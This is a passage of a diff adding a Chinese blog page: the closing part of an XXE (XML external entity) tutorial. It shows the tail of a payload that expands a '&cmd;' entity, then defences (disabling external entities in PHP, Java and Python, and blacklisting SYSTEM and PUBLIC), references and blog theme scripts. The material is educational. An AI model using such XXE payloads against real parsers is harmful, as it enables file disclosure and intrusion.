+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dir</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file</span><span class="token punctuation">></span></span><span class="token entity" title="&cmd;">&amp;cmd;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>file</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dir</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="四-如何防御"><a href="#四-如何防御" class="headerlink" title="四.如何防御"></a>四.如何防御</h1><h3 id="方案一-使用开发语言提供的禁用外部实体的方法"><a href="#方案一-使用开发语言提供的禁用外部实体的方法" class="headerlink" title="方案一 使用开发语言提供的禁用外部实体的方法"></a>方案一 使用开发语言<strong>提供的禁用外部实体的方法</strong></h3><p>PHP：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>java:</p>
+<pre class="line-numbers language-java"><code class="language-java">DocumentBuilderFactory dbf <span class="token operator">=</span>DocumentBuilderFactory<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://apache.org/xml/features/disallow-doctype-decl"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-general-entities"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-parameter-entities"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>python:</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
+xmlData <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>xmlSource<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="方案二-黑名单过滤关键字"><a href="#方案二-黑名单过滤关键字" class="headerlink" title="方案二 黑名单过滤关键字"></a>方案二 黑名单过滤关键字</h3><p>当然直接过滤掉用户提交的xml数据中的关键词也是可以的，</p>
+<p>比如说：SYSTEM和PUBLIC </p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章我从简单的xml的基础知识开始整理，以升级的方式从xxe的相关基础到花式利用进行介绍，有些地方限于文章篇幅就没有再继续深入，当然了xxe相关利用或者技巧肯定不限于我整理的这几个方面，比如说xxe还可以结合jar协议进行上传文件，不过笔者对这方面不是很熟也就没有去复盘。文章中若有错误的地方，请各位大牛指正。</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p>
+<p><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p>
+<p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p>
+<p><a href="https://www.freebuf.com/vuls/194112.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/194112.html</a></p>
+<p><a href="https://www.runoob.com/xml/xml-cdata.html" target="_blank" rel="noopener">https://www.runoob.com/xml/xml-cdata.html</a></p>
+<p><a href="http://www.mottoin.com/detail/738.html" target="_blank" rel="noopener">http://www.mottoin.com/detail/738.html</a></p>
+<p><a href="http://www.w3cschool.cn/dtd" target="_blank" rel="noopener">http://www.w3cschool.cn/dtd</a>    </p>
+<p><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p>
+<p><a href="https://www.freebuf.com/column/188849.html" target="_blank" rel="noopener">https://www.freebuf.com/column/188849.html</a></p>
+
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2019/06/02/靶机：evalsciencet通关笔记/" title="靶机：evalscience通关笔记">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment valine -->
+			<!-- show valine comment -->
+<div id="valineComment" class="comment"></div>
+
+<!-- valine`s js & css -->
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="/js/valine.min.js"></script>
+<link rel="stylesheet" href="/css/comment.css">
+
+<script>
+	var checkExistComment = setInterval(function() {
+		if( $('#valineComment').length ) {
+			new Valine({
+				// AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+				av: AV,
+				//使用id寻找div元素（使用class可能找不到）
+				el: '#valineComment',
+				emoticon_url: 'https://cloud.panjunwen.com/alu',
+				emoticon_list: ["吐.png", "期待.png", "高兴.png", "吐血倒地.png", "哭泣.png", "欢呼.png"],
+				app_id: "3333....", //获取APP ID
+				app_key: "3333......", //获取APP KEY
+				placeholder: "no any!", //评论框占位提示文字        			
+			});
+			clearInterval(checkExistComment);
+		}
+	}, 100);
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#一-什么是xxe"><span class="post-toc-text">一.什么是xxe</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#二-基础简介"><span class="post-toc-text">二.基础简介</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-0"><span class="post-toc-text">level 0</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#xml"><span class="post-toc-text">xml</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#DTD"><span class="post-toc-text">DTD</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#三-xxe的利用"><span class="post-toc-text">三.xxe的利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-1"><span class="post-toc-text">level 1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-2"><span class="post-toc-text">level 2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-3"><span class="post-toc-text">level 3</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-4"><span class="post-toc-text">level 4</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-5"><span class="post-toc-text">level 5</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-6"><span class="post-toc-text">level 6</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-7"><span class="post-toc-text">level 7</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#四-如何防御"><span class="post-toc-text">四.如何防御</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方案一-使用开发语言提供的禁用外部实体的方法"><span class="post-toc-text">方案一 使用开发语言提供的禁用外部实体的方法</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方案二-黑名单过滤关键字"><span class="post-toc-text">方案二 黑名单过滤关键字</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-text">总结</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#参考链接："><span class="post-toc-text">参考链接：</span></a></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="http://github.com/" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+					<a href="http://github.com/" title="Weibo" target="_blank"><i class="fa fa-weibo"></i>&nbsp;</a>
+				
+				
+					<a href="http://github.com/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+				
+					<a href="http://github.com/" title="QQ" target="_blank"><i class="fa fa-qq"></i>&nbsp;</a>
+					
+				
+					<a href="http://github.com/" title="Twitter" target="_blank"><i class="fa fa-twitter"></i>&nbsp;</a>
+						
+				
+		</div>
+	</div>
+
+	<div  class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2017 - 2019, content by vint. All Rights Reserved.			       	
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+	<div class="popup search-popup local-search-popup">
+    <span class="popup-btn-close">
+      ESC
+    </span>
+    <div class="container">
+      <div class="col-md-8 col-md-offset-2">
+
+        <div class="local-search-header clearfix">
+            <span class="search-icon"></span>
+            <div class="local-search-input-wrapper">
+              <input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+            </div>
+        </div>
+
+        <div id="local-search-result"></div>
+
+      </div>
+    </div>
+</div>
+
+<script src="/js/ziploader.js"></script>
+
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').fadeOut(300);
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $('.popup').fadeIn(300);
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // get search zip version
+    $.get('/searchVersion.txt?t=' + (+new Date()), function(res) {
+      if (localStorage.getItem('searchVersion') !== res) {
+        localStorage.setItem('searchVersion', res);
+        initSearchJson();
+      }
+    });
+
+    function initSearchJson () {
+      initLoad(['/search.zip'], {
+        loadOptions: {
+          success: function(obj) {
+            localStorage.setItem('searchJson', obj['search.json'])
+          },
+          error: function(e) {
+            return console.log(e)
+          }
+        },
+        returnOptions: {
+          'json': TYPE_TEXT
+        },
+        mimeOptions:{
+          'json':'application/json'
+        }
+      })
+    }
+
+    // search function;
+    var searchFunc = function(search_id, content_id) {
+      'use strict';
+
+      isfetched = true;
+      var datas = JSON.parse(localStorage.getItem('searchJson'));
+      console.log(search_id)
+      var input = document.getElementById(search_id);
+      var resultContent = document.getElementById(content_id);
+      var inputEventFunction = function() {
+        var searchText = input.value.trim().toLowerCase();
+        var keywords = searchText.split(/[\s\-]+/);
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        var resultItems = [];
+        if (searchText.length > 0) {
+          // perform local searching
+          datas.forEach(function(data) {
+            var isMatch = false;
+            var hitCount = 0;
+            var searchTextCount = 0;
+            var title = data.title ? data.title.trim() : '';
+            var titleInLowerCase = title.toLowerCase();
+            var content = data.content ? data.content.trim().replace(/<[^>]+>/g,"") : '';
+            var contentInLowerCase = content.toLowerCase();
+            var articleUrl = decodeURIComponent(data.url);
+            var indexOfTitle = [];
+            var indexOfContent = [];
+            // only match articles with not empty titles
+            keywords.forEach(function(keyword) {
+              function getIndexByWord(word, text, caseSensitive) {
+                var wordLen = word.length;
+                if (wordLen === 0) {
+                  return [];
+                }
+                var startPosition = 0, position = [], index = [];
+                if (!caseSensitive) {
+                  text = text.toLowerCase();
+                  word = word.toLowerCase();
+                }
+                while ((position = text.indexOf(word, startPosition)) > -1) {
+                  index.push({position: position, word: word});
+                  startPosition = position + wordLen;
+                }
+                return index;
+              }
+
+              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+            });
+            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+              isMatch = true;
+              hitCount = indexOfTitle.length + indexOfContent.length;
+            }
+
+            // show search results
+
+            if (isMatch) {
+              // sort index by position of keyword
+
+              [indexOfTitle, indexOfContent].forEach(function (index) {
+                index.sort(function (itemLeft, itemRight) {
+                  if (itemRight.position !== itemLeft.position) {
+                    return itemRight.position - itemLeft.position;
+                  } else {
+                    return itemLeft.word.length - itemRight.word.length;
+                  }
+                });
+              });
+
+              // merge hits into slices
+
+              function mergeIntoSlice(text, start, end, index) {
+                var item = index[index.length - 1];
+                var position = item.position;
+                var word = item.word;
+                var hits = [];
+                var searchTextCountInSlice = 0;
+                while (position + word.length <= end && index.length != 0) {
+                  if (word === searchText) {
+                    searchTextCountInSlice++;
+                  }
+                  hits.push({position: position, length: word.length});
+                  var wordEnd = position + word.length;
+
+                  // move to next position of hit
+
+                  index.pop();
+                  while (index.length != 0) {
+                    item = index[index.length - 1];
+                    position = item.position;
+                    word = item.word;
+                    if (wordEnd > position) {
+                      index.pop();
+                    } else {
+                      break;
+                    }
+                  }
+                }
+                searchTextCount += searchTextCountInSlice;
+                return {
+                  hits: hits,
+                  start: start,
+                  end: end,
+                  searchTextCount: searchTextCountInSlice
+                };
+              }
+
+              var slicesOfTitle = [];
+              if (indexOfTitle.length != 0) {
+                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+              }
+
+              var slicesOfContent = [];
+              while (indexOfContent.length != 0) {
+                var item = indexOfContent[indexOfContent.length - 1];
+                var position = item.position;
+                var word = item.word;
+                // cut out 100 characters
+                var start = position - 20;
+                var end = position + 80;
+                if(start < 0){
+                  start = 0;
+                }
+                if (end < position + word.length) {
+                  end = position + word.length;
+                }
+                if(end > content.length){
+                  end = content.length;
+                }
+                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+              }
+
+              // sort slices in content by search text's count and hits' count
+
+              slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                  return sliceRight.hits.length - sliceLeft.hits.length;
+                } else {
+                  return sliceLeft.start - sliceRight.start;
+                }
+              });
+
+              // select top N slices in content
+
+              var upperBound = parseInt('2');
+              if (upperBound >= 0) {
+                slicesOfContent = slicesOfContent.slice(0, upperBound);
+              }
+
+              // highlight title and content
+
+              function highlightKeyword(text, slice) {
+                var result = '';
+                var prevEnd = slice.start;
+                slice.hits.forEach(function (hit) {
+                  result += text.substring(prevEnd, hit.position);
+                  var end = hit.position + hit.length;
+                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                  prevEnd = end;
+                });
+                result += text.substring(prevEnd, slice.end);
+                return result;
+              }
+
+              var resultItem = '';
+
+              if (slicesOfTitle.length != 0) {
+                resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+              } else {
+                resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+              }
+
+              slicesOfContent.forEach(function (slice) {
+                resultItem +=  "<p class=\"search-result\">" + highlightKeyword(content, slice) + "...</p>";
+              });
+
+              resultItem += "</li>";
+              resultItems.push({
+                item: resultItem,
+                searchTextCount: searchTextCount,
+                hitCount: hitCount,
+                id: resultItems.length
+              });
+            }
+          })
+        };
+        if (keywords.length === 1 && keywords[0] === "") {
+          resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+        } else if (resultItems.length === 0) {
+          resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /> no result </div>'
+        } else {
+          resultItems.sort(function (resultLeft, resultRight) {
+            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+              return resultRight.searchTextCount - resultLeft.searchTextCount;
+            } else if (resultLeft.hitCount !== resultRight.hitCount) {
+              return resultRight.hitCount - resultLeft.hitCount;
+            } else {
+              return resultRight.id - resultLeft.id;
+            }
+          });
+          var searchResultList = '<ul class=\"search-result-list\">';
+          resultItems.forEach(function (result) {
+            searchResultList += result.item;
+          })
+          searchResultList += "</ul>";
+          resultContent.innerHTML = searchResultList;
+        }
+      }
+
+      if ('auto' === 'auto') {
+        input.addEventListener('input', inputEventFunction);
+      } else {
+        $('.search-icon').click(inputEventFunction);
+        input.addEventListener('keypress', function (event) {
+          if (event.keyCode === 13) {
+            inputEventFunction();
+          }
+        });
+      }
+
+      // remove loading animation
+      $('body').css('overflow', '');
+
+      proceedsearch();
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        $('.sb-close').click();
+        searchFunc('local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(/img/random/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
+
